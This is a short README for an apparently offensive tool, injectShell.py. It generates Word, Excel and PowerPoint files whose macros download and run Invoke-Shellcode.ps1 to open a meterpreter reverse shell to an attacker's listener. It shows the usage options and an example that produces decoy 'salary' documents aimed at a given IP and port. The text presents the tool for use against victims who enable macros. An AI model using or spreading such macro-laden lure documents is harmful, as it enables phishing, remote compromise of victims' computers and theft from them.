# Social-Engineering-Toys
Social Engineering Toys  
  
The script generates office documents (xls, doc and ppt) that includes VBA code that download and run the Invoke-Shellcode.ps1 (creates a meterpreter reverse shell back to server) when the victim enables Macro in the document.  
  
```
$  python injectShell.py -h
usage: injectShell.py [-h] [-t T] [-o O] [-ip IP] [-port PORT]

optional arguments:
  -h, --help  show this help message and exit
  -t T        [xls|doc|ppt]
  -o O        [output filename (without extension)]
  -ip IP      [meterpreter listener ip address]
  -port PORT  [meterpreter listener port]

```
```
$  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111 
- Generated: salary.xls
- Generated: salary.doc
- Generated: salary.ppt
```

